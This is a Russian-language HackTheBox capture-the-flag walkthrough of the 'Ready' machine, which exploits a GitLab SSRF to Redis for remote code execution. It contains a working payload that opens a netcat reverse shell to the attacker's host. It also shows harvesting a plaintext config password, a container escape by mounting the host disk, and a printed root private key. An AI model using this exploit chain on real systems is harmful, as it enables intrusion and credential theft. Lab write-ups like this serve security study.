# Ready
## HTB machine

- Название: Ready  
- OS: OpenBSD
- Ресурс: HackTheBox
- Сложность: Medium
- Дата релиза: 12.12.20

## Write-up

```html
┌──(user@kali)-[~/Downloads]
└─$ nmap -sV 10.10.10.220
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 00:48 EST
Nmap scan report for 10.10.10.220
Host is up (0.086s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
5080/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.73 seconds
```

>Создаем аккаунт на гитлаб, можно поискать админа по id;

```html
http://10.10.10.220:5080/abuse_reports/new?user_id=1
@root Administrator
```

>Ищем данную версию на наличие уязвимостей -- https://github.com/jas502n/gitlab-SSRF-redis-RCE

```html
new project > import > Repo by URL

В "Git repository URL" пишем;

git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
```

>Идем в CyberChef и кодируем в URL строки:

```html
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|cat /flag | nc <mark>нужный ip</mark> <mark>нужный порт</mark> -e /bin/bash \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
/ssrf.git
```

>И вставляем результат. Перед тем как создать репозиторий, запускаем слушатель:

```html
┌──(user@kali)-[~/Downloads]
└─$ nc -nlvp 7890
listening on [any] 7890 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.220] 36394
id
uid=998(git) gid=998(git) groups=998(git)
python3 -c 'import pty; pty.spawn("/bin/bash")'
git@gitlab:~/gitlab-rails/working$ id
id
uid=998(git) gid=998(git) groups=998(git)
```

>Первый флаг:

```html
git@gitlab://home/dude$ cat user.txt
cat user.txt
e1e30b052b6ec067069880**********
```

>В одном из каталогов находим следующее:

```html
git@gitlab://opt/backup$ cat gitlab.rb
...
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
...
```

>Эскалируемся до рута, но взять флаг пока невозможно:

```html
git@gitlab://opt/backup$ su root
su root
Password: wW59U!ZKMbG9+*#h
root@gitlab://opt/backup# id
id
uid=0(root) gid=0(root) groups=0(root)
```

>Создаем тестовый каталог и монтируем /dev/sda2 в него:

```html
root@gitlab:~# mkdir /tmp/root
mkdir /tmp/root
root@gitlab:~# mount /dev/sda2 /tmp/root
mount /dev/sda2 /tmp/root
```

>Сохраняем себе приватный ключ

```html
root@gitlab:~# cat /tmp/root/root/.ssh/id_rsa
cat /tmp/root/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
YqHm9TqSH5BcKPLoMO-----Vhmz7xErbzfYg9fJU-----yCIGAMpXoPlJ90GbGof
Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
K4ku7QECgYE---3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2---1BIZSxMayMXL
g7vSV+D/almaAC---SIrBjY8ZhGMd+kbloPJLRKA9ob8rf---vPEWAW81vNqBBi2
3hO044mOPeiqsHM/+-----------------------------HsidSJo4ECgYEA1jzy
n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
-----END RSA PRIVATE KEY-----
```

>Даем права файлу id_rsa и с его помощью заходим:

```html
┌──(user@kali)-[~/Downloads]
└─$ sudo chmod 600 id_rsa

┌──(user@kali)-[~/Downloads]
└─$ sudo ssh -i id_rsa 10.10.10.220                                          130 ⨯
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.10.220 (10.10.10.220)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.220' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 11 Jan 2021 05:38:06 AM UTC

  System load:                      0.03
  Usage of /:                       65.3% of 17.59GB
  Memory usage:                     83%
  Swap usage:                       0%
  Processes:                        341
  Users logged in:                  0
  IPv4 address for br-bcb73b090b3f: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.220
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:8160

  => There are 9 zombie processes.


170 updates can be installed immediately.
73 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Dec 13 15:04:10 2020 from 10.10.14.5
```

>И получаем второй флаг:

```html
root@ready:~# ls
docker-gitlab  ready-channel  root.txt  snap
root@ready:~# cat root.txt
b7f98681505cd39066f671**********
```
